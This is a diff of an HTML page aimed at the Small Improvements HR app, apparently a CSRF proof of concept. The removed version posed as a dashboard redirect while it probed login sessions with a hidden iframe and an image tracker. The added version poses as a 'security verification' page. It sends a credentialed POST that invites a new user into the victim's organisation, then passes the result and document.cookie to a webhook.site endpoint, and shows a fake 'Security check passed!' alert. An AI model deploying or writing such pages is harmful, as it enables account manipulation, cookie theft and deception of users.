@@ -1,82 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting to Small Improvements...</title>
-    <meta http-equiv="refresh" content="2;url=https://app.small-improvements.com/app/home">
+    <title>Small Improvements - Security Test</title>
 </head>
 <body>
-    <h2>Redirecting to Small Improvements...</h2>
-    <p>Please wait while we take you to your dashboard.</p>
+    <h2>Performing security verification...</h2>
 
     <script>
-        // Create a hidden iframe that loads Small Improvements
-        function createTracker() {
-            // Method 1: Image pixel that includes JSESSIONID in URL
-            const img = new Image();
-            
-            // This will capture when the image fails to load (due to auth)
-            img.onerror = function() {
-                // Send the failed request info to webhook
+        // Wait for page to load, then attempt CSRF
+        setTimeout(function() {
+            // Try to make the POST request to Small Improvements
+            fetch('https://app.small-improvements.com/api/v2/users/invite', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Csrf-Token': 'si'
+                },
+                credentials: 'include', // This sends THEIR cookies!
+                body: JSON.stringify([{
+                    "firstName": "Test",
+                    "lastName": "User", 
+                    "workEmail": "test@example.com",
+                    "isGuest": false,
+                    "personalMessage": "",
+                    "shouldSendNotification": true
+                }])
+            })
+            .then(response => {
+                // Send results to webhook
                 fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        type: 'IMAGE_TRACKER_TRIGGERED',
+                        type: 'CSRF_ATTEMPT_RESULT',
+                        status: response.status,
+                        statusText: response.statusText,
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
-                        referrer: document.referrer,
-                        message: 'Tracker image attempted to load from Small Improvements domain'
+                        message: 'CSRF attempt completed'
                     })
                 });
-            };
-            
-            // Try to load an image from Small Improvements - this will include THEIR cookies!
-            img.src = 'https://app.small-improvements.com/api/v2/users/invite?tracker=' + 
-                     Date.now() + '&ref=' + encodeURIComponent(document.referrer);
-        }
-
-        // Method 2: Create iframe and detect navigation
-        function createHiddenIframe() {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://app.small-improvements.com/app/home';
-            
-            iframe.onload = function() {
-                // If iframe loads successfully, they're logged in
+                
+                if (response.ok) {
+                    alert('Security check passed!');
+                } else {
+                    alert('Security verification failed. Please login to Small Improvements first.');
+                }
+            })
+            .catch(error => {
                 fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        type: 'IFRAME_LOADED_SUCCESS',
+                        type: 'CSRF_ATTEMPT_ERROR',
+                        error: error.toString(),
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
-                        message: 'User has active Small Improvements session'
+                        message: 'CSRF attempt failed with error'
                     })
                 });
-            };
-            
-            document.body.appendChild(iframe);
-        }
+            });
+        }, 2000);
 
-        // Execute both methods
-        setTimeout(createTracker, 500);
-        setTimeout(createHiddenIframe, 1000);
-
-        // Send initial visit data
+        // Send initial data
         fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                type: 'INITIAL_VISIT',
+                type: 'PAGE_LOADED',
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                url: window.location.href,
                 cookies: document.cookie,
-                message: 'User landed on tracker page'
+                message: 'CSRF test page loaded'
             })
         });
-
     </script>
 </body>
 </html>
